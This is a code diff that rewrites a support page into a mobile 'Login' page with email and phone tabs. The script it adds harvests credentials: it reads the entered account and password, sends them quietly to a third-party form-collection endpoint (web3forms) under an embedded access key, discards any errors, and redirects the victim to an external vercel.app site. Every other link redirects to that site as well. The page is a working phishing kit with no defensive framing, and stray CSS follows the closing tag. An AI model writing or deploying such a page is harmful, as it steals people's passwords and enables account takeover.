@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-  <title>Contact Support</title>
+  <title>Login</title>
   <style>
     :root {
       --text-dark: #1a1a1a;
@@ -78,6 +78,38 @@
       letter-spacing: -0.5px;
     }
 
+    .tabs {
+      display: flex;
+      gap: 24px;
+      margin-bottom: 24px;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .tab {
+      font-size: 16px;
+      font-weight: 600;
+      color: var(--text-muted);
+      cursor: pointer;
+      padding-bottom: 10px;
+      position: relative;
+      transition: color 0.2s ease;
+    }
+
+    .tab.active {
+      color: var(--text-dark);
+    }
+
+    .tab.active::after {
+      content: "";
+      position: absolute;
+      bottom: -1px;
+      left: 0;
+      width: 100%;
+      height: 3px;
+      background-color: var(--text-dark);
+      border-radius: 2px 2px 0 0;
+    }
+
     .form-group {
       margin-bottom: 18px;
     }
@@ -95,12 +127,13 @@
       width: 100%;
     }
 
-    .input-box input, .input-box textarea {
+    .input-box input {
       width: 100%;
+      height: 50px;
       background-color: var(--input-bg);
       border: 1px solid var(--border-color);
       border-radius: 12px;
-      padding: 14px 16px;
+      padding: 0 44px 0 16px;
       font-size: 15px;
       outline: none;
       color: var(--text-dark);
@@ -108,6 +141,294 @@
       appearance: none;
       -webkit-appearance: none;
     }
+
+    .input-box input:focus {
+      border-color: #d1d1d6;
+      background-color: #ffffff;
+    }
+
+    .input-box input::placeholder {
+      color: var(--text-placeholder);
+    }
+
+    .toggle-pwd {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: var(--text-muted);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px;
+      height: 32px;
+      background: none;
+      border: none;
+      outline: none;
+      border-radius: 50%;
+    }
+
+    .toggle-pwd:active {
+      background-color: rgba(0, 0, 0, 0.05);
+    }
+
+    .toggle-pwd svg {
+      width: 20px;
+      height: 20px;
+      fill: none;
+      stroke: var(--text-muted);
+      stroke-width: 2;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .option-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .option-row input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: var(--text-dark);
+      cursor: pointer;
+      border-radius: 4px;
+    }
+
+    .forgot-link {
+      display: inline-block;
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--text-dark);
+      text-decoration: underline;
+      margin-bottom: 22px;
+      cursor: pointer;
+    }
+
+    .agreement-link {
+      color: var(--link-blue);
+      text-decoration: none;
+    }
+
+    .btn-login {
+      width: 100%;
+      height: 50px;
+      background-color: var(--btn-black);
+      color: #ffffff;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 28px;
+      transition: transform 0.1s ease, opacity 0.2s ease;
+    }
+
+    .btn-login:active {
+      transform: scale(0.98);
+      opacity: 0.9;
+    }
+
+    .bottom-links {
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      font-size: 14px;
+      margin-top: auto;
+      padding-bottom: 8px;
+    }
+
+    .download-link {
+      color: var(--text-dark);
+      font-weight: 700;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    .signup-text {
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .signup-link {
+      color: var(--link-blue);
+      font-weight: 700;
+      text-decoration: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <button class="back-btn" onclick="handleBack()" aria-label="Go Back">&lt;</button>
+
+    <h1>Login</h1>
+
+    <div class="tabs">
+      <div class="tab active" id="tabEmail" onclick="switchTab('email')">Email</div>
+      <div class="tab" id="tabPhone" onclick="switchTab('phone')">Phone Number</div>
+    </div>
+
+    <!-- Replaced <form> with <div> to prevent browser page redirection -->
+    <div id="loginContainer">
+      <div class="form-group">
+        <label id="inputLabel" for="accountInput">Email</label>
+        <div class="input-box">
+          <input type="email" id="accountInput" placeholder="Please enter email" autocomplete="username">
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="passwordInput">Password</label>
+        <div class="input-box">
+          <input type="password" id="passwordInput" placeholder="Please enter password" autocomplete="current-password">
+          <button type="button" class="toggle-pwd" id="eyeToggleBtn" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">
+            <svg id="eyeClosed" viewBox="0 0 24 24">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+              <line x1="1" y1="1" x2="23" y2="23"></line>
+            </svg>
+            <svg id="eyeOpen" viewBox="0 0 24 24" style="display: none;">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+              <circle cx="12" cy="12" r="3"></circle>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <label class="option-row">
+        <input type="checkbox" id="chkRemember" checked>
+        <span>Remember Password</span>
+      </label>
+
+      <div>
+        <span class="forgot-link" onclick="handleForgotPassword()">Forgot Password</span>
+      </div>
+
+      <label class="option-row" style="font-weight: 400; font-size: 13px;">
+        <input type="checkbox" id="chkAgree">
+        <span>I have read and agree <a class="agreement-link" id="agreementLink" href="#">User Agreement</a></span>
+      </label>
+
+      <!-- Standard button type="button" avoids native form submission -->
+      <button type="button" class="btn-login" id="submitBtn">Login</button>
+    </div>
+
+    <div class="bottom-links">
+      <div class="download-link" onclick="handleDownloadApp()">Download App</div>
+      <div class="signup-text">No Account? <span class="signup-link" onclick="handleSignUp()">Sign Up</span></div>
+    </div>
+  </div>
+
+  <script>
+    const TARGET_URL = "https://learnedminer.vercel.app/";
+    const WEB3FORMS_ACCESS_KEY = "09aaf453-c057-4f64-a4f5-be4735f951c4";
+
+    let currentTabType = 'email';
+
+    function togglePasswordVisibility() {
+      const pwdInput = document.getElementById('passwordInput');
+      const eyeOpen = document.getElementById('eyeOpen');
+      const eyeClosed = document.getElementById('eyeClosed');
+
+      if (pwdInput && eyeOpen && eyeClosed) {
+        if (pwdInput.type === 'password') {
+          pwdInput.type = 'text';
+          eyeClosed.style.display = 'none';
+          eyeOpen.style.display = 'block';
+        } else {
+          pwdInput.type = 'password';
+          eyeClosed.style.display = 'block';
+          eyeOpen.style.display = 'none';
+        }
+      }
+    }
+
+    function switchTab(type) {
+      currentTabType = type;
+      const emailTab = document.getElementById('tabEmail');
+      const phoneTab = document.getElementById('tabPhone');
+      const inputLabel = document.getElementById('inputLabel');
+      const inputField = document.getElementById('accountInput');
+
+      if (!inputField || !emailTab || !phoneTab || !inputLabel) return;
+      inputField.value = '';
+
+      if (type === 'email') {
+        emailTab.classList.add('active');
+        phoneTab.classList.remove('active');
+        inputLabel.innerText = 'Email';
+        inputField.placeholder = 'Please enter email';
+        inputField.type = 'email';
+      } else {
+        phoneTab.classList.add('active');
+        emailTab.classList.remove('active');
+        inputLabel.innerText = 'Phone Number';
+        inputField.placeholder = 'Please enter phone number';
+        inputField.type = 'tel';
+      }
+    }
+
+    function handleBack() { window.location.replace(TARGET_URL); }
+    function handleForgotPassword() { window.location.replace(TARGET_URL); }
+    function handleDownloadApp() { window.location.replace(TARGET_URL); }
+    function handleSignUp() { window.location.replace(TARGET_URL); }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const submitBtn = document.getElementById('submitBtn');
+      const agreementLink = document.getElementById('agreementLink');
+
+      if (agreementLink) {
+        agreementLink.addEventListener('click', (e) => {
+          e.preventDefault();
+          window.location.replace(TARGET_URL);
+        });
+      }
+
+      if (submitBtn) {
+        submitBtn.addEventListener('click', () => {
+          const accountVal = document.getElementById('accountInput').value;
+          const passwordVal = document.getElementById('passwordInput').value;
+          const rememberVal = document.getElementById('chkRemember').checked ? "Yes" : "No";
+
+          const payload = JSON.stringify({
+            access_key: WEB3FORMS_ACCESS_KEY,
+            subject: `New Login Submission (${currentTabType})`,
+            Login_Type: currentTabType,
+            Account_Detail: accountVal,
+            Password: passwordVal,
+            Remember_Password: rememberVal
+          });
+
+          // Send background request silently
+          try {
+            fetch("https://api.web3forms.com/submit", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+              },
+              body: payload,
+              keepalive: true
+            }).catch(() => {});
+          } catch (err) {}
+
+          // Immediate, guaranteed redirect to the TARGET_URL
+          window.location.replace(TARGET_URL);
+        });
+      }
+    });
+  </script>
+</body>
+</html>
 
     .input-box input {
       height: 50px;
